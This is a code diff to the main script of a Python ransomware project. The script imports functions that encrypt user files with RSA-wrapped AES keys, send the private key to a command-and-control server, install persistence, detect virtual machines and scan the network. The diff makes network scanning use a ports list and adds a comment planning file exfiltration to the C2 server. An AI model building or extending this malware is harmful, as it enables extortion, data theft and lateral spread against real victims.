@@ -1,13 +1,13 @@
 import multiprocessing
 from datetime import datetime, timedelta
-from Core.Variables import seconds_left, timer_file_name, script_name_exe, script_name_elf
+from Core.Variables import seconds_left, timer_file_name, script_name_exe, script_name_elf, ports
 from Crypto.Encrypt import generate_rsa_keys, save_encrypted_aes_key, save_rsa_keys, generate_symmetric_key, encrypt_aes_key_with_rsa, encrypt_user_files
 from Core.Timer import save_timer_data, watchdog_timer,load_timer_data
 from Crypto.RSA_Key_Handling import send_private_key_to_c2
 from System.Persistence import os_check
 from System.VM_Check import running_in_vm
 from Session.Session_Handling import get_session_token
-from Network.Network import network_scan
+from Network.Network import scan_network
 
 ####################################################################################################################
 
@@ -32,8 +32,9 @@ if timer_data:
     watchdog_process.start()
 
 else:
-    network_scan()
+    scan_network(ports)
     print("No Timer Data Exist") # Debug Message
+    # Next stage is file download into c2 server
     # Generate the RSA keys
     private_key, public_key = generate_rsa_keys()
     save_rsa_keys(private_key, public_key)
